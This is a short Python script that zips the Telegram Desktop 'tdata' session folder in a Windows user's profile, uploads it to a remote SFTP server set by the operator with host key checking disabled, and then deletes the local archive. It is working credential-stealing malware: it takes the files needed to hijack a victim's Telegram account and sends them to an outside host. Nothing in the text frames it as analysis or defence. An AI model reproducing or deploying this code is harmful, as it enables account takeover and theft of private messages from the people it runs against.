import os, platform, pysftp
from zipfile import ZipFile

ftp_host = 'host' # enter here the ftp or sftp server hosting
ftp_port = 22 # enter here the ftp port or sftp server
ftp_user = 'username' # enter your hosting username here
ftp_pass = 'password' # enter your hosting password here
ftp_dir = '/path/to/directory' # specify where you want to save the file

telegram_folder = os.path.join(os.path.expanduser("~"), 'AppData', 'Roaming', 'Telegram Desktop UWP', 'tdata')
telegram_zip = os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Temp', 'tdata.zip')

cnopts = pysftp.CnOpts()
cnopts.hostkeys = None

with pysftp.Connection(host=ftp_host, username=ftp_user, password=ftp_pass, port=ftp_port, cnopts=cnopts) as sftp:
    telegram_online = True

    while telegram_online:
        try:
            f1 = os.listdir(telegram_folder)
            files = [os.path.join(telegram_folder, f) for f in f1]

            with ZipFile(telegram_zip, 'w') as z:
                for f in files:
                    if os.path.isdir(f):
                        for root, dirs, files2 in os.walk(f):
                            for file in files2:
                                z.write(os.path.join(root, file))
                    else:
                        z.write(f)

            with open(telegram_zip, 'rb') as file:
                file.seek(0)
                sftp.putfo(file, f'{ftp_dir}/tdata.zip')
            os.remove(telegram_zip)
            telegram_online = False
        except Exception as e:
            print(e)
            if not telegram_online:
                break
            pass
